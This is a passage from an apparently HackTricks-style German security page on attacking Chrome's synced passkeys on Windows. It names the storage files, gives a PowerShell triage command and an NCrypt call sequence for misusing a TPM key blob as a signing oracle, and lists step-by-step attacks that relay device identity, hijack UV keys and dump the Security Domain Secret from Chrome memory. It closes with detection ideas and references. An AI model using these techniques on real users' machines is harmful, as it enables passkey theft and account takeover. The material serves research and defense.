%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```

- **`Sync Data\LevelDB`** speichert protobuf-codierte **`WebauthnCredentialSpecifics`**-Datensätze. Ein Prozess desselben Benutzers kann die **RP ID**, den **Benutzernamen**, die **Credential-ID** und das verschlüsselte Private-Key-Material synchronisierter Passkeys auflisten.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** speichert den lokalen Geräteeinschreibungsstatus, darunter **`wrapped_identity_private_key`** und das verpackte Secret, das zum Wiederherstellen synchronisierter Credentials verwendet wird.<sup>[[4]](#references)</sup>

Schnelle Triage:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-gebundene Schlüssel-Blobs lassen sich dennoch als lokales Signaturorakel missbrauchen

Wenn der Browser einen TPM-gestützten Identitätsschlüssel als **`NCRYPT_OPAQUE_KEY_BLOB`** exportiert und dieses Blob in einem für Benutzer zugänglichen Zustand speichert, muss Malware **nicht** den rohen privaten Schlüssel extrahieren. Sie kann das Blob einfach auf **demselben Rechner** erneut importieren und das lokale TPM auffordern, vom Angreifer kontrollierte Daten zu signieren:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Das bedeutet: **Hardware-Bindung verhindert den Export vom Gerät, aber nicht die Nutzung durch denselben Benutzer auf dem kompromittierten Endpunkt**.

### Praktische Angriffsmöglichkeiten

1. **Pass-ta-key / Weiterleitung der Geräteidentität**<sup>[[4]](#references)</sup>
   - `WebauthnCredentialSpecifics` aus Chromes LevelDB auflisten.
   - Einen Passkey-Login starten und eine neue WebAuthn-Challenge abrufen.
   - Den gestohlenen `wrapped_identity_private_key`-Blob auf dem TPM des Opfers verwenden, um die Bindung der Cloud-Authenticator-Anfrage zu signieren.
   - Die zurückgegebene Assertion an die Relying Party weiterleiten.
   - Das ist besonders wertvoll, wenn die RP `userVerification=preferred` akzeptiert oder Assertions mit **`UV=0`** nicht zurückweist.
2. **Hijacking eines ausstehenden UV-Schlüssels**<sup>[[4]](#references)</sup>
   - Ein erneutes Onboarding erzwingen, indem `passkey_enclave_state` gelöscht oder eine gültige signierte `device/forget`-Operation gesendet wird.
   - Wenn das Onboarding das Gerät im Zustand **`uv_key_pending`** belässt, einen vom Angreifer kontrollierten öffentlichen UV-Schlüssel registrieren.
   - Wenn der Anbieter die Attestierung bzw. den Ursprung in sicherer Hardware für den neuen UV-Schlüssel nicht überprüft, werden spätere Signaturen des Angreifer-Schlüssels als **`UV=1`** behandelt.
3. **Diebstahl des Master Secrets / der SDS-Wiederherstellung**<sup>[[4]](#references)</sup>
   - Eine Wiederherstellung oder erneute Verknüpfung erzwingen, sodass Chrome das Master Secret der synchronisierten Passkeys abruft.
   - Die Neuerstellung/Änderung von `passkey_enclave_state` überwachen und dann den Chrome-Speicher auslesen, solange das Klartext-**Security Domain Secret (SDS)** im Speicher liegt.
   - Die wiederhergestellte SDS verwenden, um die verschlüsselten Felder in jedem `WebauthnCredentialSpecifics`-Datensatz zu entschlüsseln und portable private WebAuthn-Schlüssel wiederherzustellen.

### DFIR- / Erkennungsideen

- **Löschung/Neuerstellung** von `passkey_enclave_state` überwachen.<sup>[[4]](#references)</sup>
- Ungewöhnliche Zugriffe auf Chromes **`Sync Data\LevelDB`** durch Prozesse außerhalb des Browsers melden.
- **Chrome-Speicherdumps** oder verdächtige prozessübergreifende Speicherzugriffe melden.
- Wiederholte Aufforderungen zur Eingabe der **Google Password Manager-Wiederherstellungs-PIN** oder unerwartetes erneutes Onboarding untersuchen.
- Beachten, dass WebAuthn-**`signCount`** bei synchronisierten Passkeys oft nicht hilfreich ist, da der Wert konstant bleiben kann. Die klassische Klonerkennung ist daher wenig wirksam.

## References

- [1] [Unit 42 – Eine Untersuchung jahrelang unentdeckter Operationen gegen besonders wertvolle Sektoren](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Word-VBA-Makro-Phishing über SMTP → Entschlüsselung von hMailServer-Zugangsdaten → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Einblick in Ink Dragon: Aufdeckung des Relay-Netzwerks und der Abläufe einer verdeckten offensiven Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Eine neuartige Angriffsfläche bei passwortloser Authentifizierung](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-Schlüsselspeicher](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows-Hacking: Angriffe auf Microsoft-Systeme und -Netzwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [So funktioniert der Active-Directory-Datenspeicher wirklich: Einblick in NTDS.dit (Teil 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Remote-Lsass-Dump von Passwörtern](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho erweitert sein Cyber-Spionage-Arsenal mit dem Still-Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW-Funktion und `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy-Backupmodus `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – aktive Sitzungen beenden](https://telegram.org/faq)
- [14] [Microsoft Learn: Remote Credential Guard und Restricted Admin](https://learn.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard)
- [15] [Microsoft Learn: Schutz und Verwaltung von Anmeldeinformationen](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/credentials-protection-and-management)
{{#include ../../banners/hacktricks-training.md}}
